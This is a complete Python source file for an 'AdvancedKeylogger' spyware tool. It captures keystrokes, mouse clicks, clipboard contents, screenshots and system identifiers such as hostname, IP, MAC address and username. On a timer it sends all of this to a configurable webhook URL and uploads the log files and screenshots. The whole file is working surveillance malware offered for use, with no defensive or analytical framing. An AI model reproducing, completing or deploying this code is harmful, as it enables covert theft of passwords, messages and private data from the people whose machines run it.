import time
import os
import platform
import socket
import requests
import threading
import pyperclip
import uuid
import json
from datetime import datetime
from pynput import keyboard, mouse
from threading import Timer, Lock

# Try to use PIL for screenshots, but have a fallback
try:
    from PIL import ImageGrab
    SCREENSHOT_AVAILABLE = True
except ImportError:
    print("Warning: PIL/Pillow not available. Screenshots will be disabled.")
    SCREENSHOT_AVAILABLE = False

class AdvancedKeylogger:
    def __init__(self, webhook_url, report_interval=60, take_screenshots=True, monitor_clipboard=True, log_clicks=True):
        self.webhook_url = webhook_url
        self.report_interval = report_interval
        self.take_screenshots = take_screenshots and SCREENSHOT_AVAILABLE
        self.monitor_clipboard = monitor_clipboard
        self.log_clicks = log_clicks
        
        # Create logs directory if it doesn't exist
        self.log_dir = os.path.join(os.path.dirname(os.path.abspath(__file__)), "logs")
        os.makedirs(self.log_dir, exist_ok=True)
        
        # Initialize log storage
        self.keystroke_log = ""
        self.mouse_log = []
        self.clipboard_data = []
        self.screenshot_files = []
        
        # System information
        self.system_info = self.get_system_info()
        
        # Clipboard monitoring
        self.last_clipboard = ""
        
        # Thread locks
        self.lock = Lock()
        self.start_dt = self.get_timestamp()
        
    def get_timestamp(self):
        return datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    def get_system_info(self):
        try:
            info = {
                "platform": platform.system(),
                "platform-release": platform.release(),
                "platform-version": platform.version(),
                "architecture": platform.machine(),
                "hostname": socket.gethostname(),
                "ip-address": socket.gethostbyname(socket.gethostname()),
                "mac-address": ':'.join(['{:02x}'.format((uuid.getnode() >> ele) & 0xff) for ele in range(0,8*6,8)][::-1]),
                "processor": platform.processor(),
                "username": os.getlogin()
            }
            return info
        except Exception as e:
            return {"error": str(e)}
        
    def keyboard_callback(self, key):
        with self.lock:
            try:
                char = key.char
                self.keystroke_log += char
            except AttributeError:
                if key == keyboard.Key.space:
                    self.keystroke_log += " "
                elif key == keyboard.Key.enter:
                    self.keystroke_log += "\n"
                elif key == keyboard.Key.tab:
                    self.keystroke_log += "\t"
                else:
                    self.keystroke_log += f"[{str(key).replace('Key.', '')}]"
    
    def mouse_callback(self, x, y, button, pressed):
        if pressed:
            timestamp = self.get_timestamp()
            action = {"time": timestamp, "x": x, "y": y, "button": str(button), "pressed": pressed}
            with self.lock:
                self.mouse_log.append(action)
    
    def monitor_clipboard_func(self):
        while self.monitor_clipboard:
            current_clipboard = pyperclip.paste()
            if current_clipboard != self.last_clipboard and current_clipboard.strip():
                timestamp = self.get_timestamp()
                with self.lock:
                    self.clipboard_data.append({
                        "time": timestamp,
                        "data": current_clipboard
                    })
                self.last_clipboard = current_clipboard
            time.sleep(3)  # Check clipboard every 3 seconds
    
    def take_screenshot_func(self):
        if not self.take_screenshots or not SCREENSHOT_AVAILABLE:
            return
            
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        screenshot_path = os.path.join(self.log_dir, f"screenshot_{timestamp}.png")
        try:
            screenshot = ImageGrab.grab()
            screenshot.save(screenshot_path)
            with self.lock:
                self.screenshot_files.append(screenshot_path)
        except Exception as e:
            print(f"Error taking screenshot: {e}")
    
    def upload_file(self, file_path):
        try:
            with open(file_path, 'rb') as file:
                files = {'file': (os.path.basename(file_path), file, 'application/octet-stream')}
                response = requests.post(self.webhook_url, files=files)
                return response.status_code == 200 or response.status_code == 204
        except Exception as e:
            print(f"Error uploading file {file_path}: {e}")
            return False
            
    def report(self):
        self.take_screenshot_func()  # Take a screenshot before reporting
        
        with self.lock:
            report_data = {
                "timestamp": self.get_timestamp(),
                "system_info": self.system_info,
                "keystrokes": self.keystroke_log if self.keystroke_log else "No keystrokes recorded",
                "mouse_actions": self.mouse_log if self.mouse_log else [],
                "clipboard": self.clipboard_data if self.clipboard_data else []
            }
            
            # Create a log file with all the data
            log_timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            log_file = os.path.join(self.log_dir, f"log_{log_timestamp}.json")
            
            with open(log_file, 'w') as f:
                json.dump(report_data, f, indent=4)
            
            # Send text report to webhook
            payload = {
                "content": f"Keylog Report ({self.start_dt} to {self.get_timestamp()}):",
                "embeds": [
                    {
                        "title": "System Information",
                        "description": f"```json\n{json.dumps(self.system_info, indent=2)}\n```",
                        "color": 5814783
                    }
                ]
            }
            
            if self.keystroke_log:
                payload["embeds"].append({
                    "title": "Keystroke Log",
                    "description": f"```\n{self.keystroke_log[:1500]}{'...' if len(self.keystroke_log) > 1500 else ''}\n```",
                    "color": 15158332
                })
            
            if self.clipboard_data:
                clipboard_text = "\n".join([f"{item['time']}: {item['data'][:100]}{'...' if len(item['data']) > 100 else ''}" 
                                           for item in self.clipboard_data[-5:]])
                payload["embeds"].append({
                    "title": "Recent Clipboard Contents",
                    "description": f"```\n{clipboard_text}\n```",
                    "color": 3447003
                })
            
            try:
                response = requests.post(self.webhook_url, json=payload)
                if response.status_code == 204 or response.status_code == 200:
                    print(f"Report sent successfully at {self.get_timestamp()}")
                else:
                    print(f"Failed to send report. Status code: {response.status_code}")
            except Exception as e:
                print(f"Error sending report: {e}")
            
            # Upload screenshots
            for screenshot in self.screenshot_files:
                if os.path.exists(screenshot):
                    print(f"Uploading screenshot: {screenshot}")
                    success = self.upload_file(screenshot)
                    if success and not os.path.exists("keep_screenshots"):
                        try:
                            os.remove(screenshot)
                        except:
                            pass
            
            # Upload log file
            self.upload_file(log_file)
            
            # Reset logs
            self.keystroke_log = ""
            self.mouse_log = []
            self.clipboard_data = []
            self.screenshot_files = []
            self.start_dt = self.get_timestamp()
        
        # Schedule the next report
        Timer(self.report_interval, self.report).start()
    
    def start(self):
        # Start keyboard listener
        keyboard_listener = keyboard.Listener(on_press=self.keyboard_callback)
        keyboard_listener.start()
        
        # Start mouse listener if enabled
        if self.log_clicks:
            mouse_listener = mouse.Listener(on_click=self.mouse_callback)
            mouse_listener.start()
        
        # Start clipboard monitoring if enabled
        if self.monitor_clipboard:
            clipboard_thread = threading.Thread(target=self.monitor_clipboard_func)
            clipboard_thread.daemon = True
            clipboard_thread.start()
        
        print(f"Advanced Keylogger started at {self.get_timestamp()}")
        print(f"Sending reports to webhook every {self.report_interval} seconds")
        
        # Send initial system information
        initial_payload = {
            "content": "Advanced Keylogger Started",
            "embeds": [
                {
                    "title": "System Information",
                    "description": f"```json\n{json.dumps(self.system_info, indent=2)}\n```",
                    "color": 5814783
                }
            ]
        }
        
        try:
            requests.post(self.webhook_url, json=initial_payload)
        except Exception as e:
            print(f"Error sending initial report: {e}")
        
        # Start reporting timer
        self.report()
        
        # Keep the main thread alive
        keyboard_listener.join()

if __name__ == "__main__":
    # Replace with your actual webhook URL
    WEBHOOK_URL = "Your webhook url here"
    
    # Configuration options
    REPORT_INTERVAL = 60  # seconds
    TAKE_SCREENSHOTS = True
    MONITOR_CLIPBOARD = True
    LOG_CLICKS = True
    
    # Start the keylogger
    keylogger = AdvancedKeylogger(
        WEBHOOK_URL, 
        report_interval=REPORT_INTERVAL,
        take_screenshots=TAKE_SCREENSHOTS,
        monitor_clipboard=MONITOR_CLIPBOARD,
        log_clicks=LOG_CLICKS
    )
    keylogger.start()     
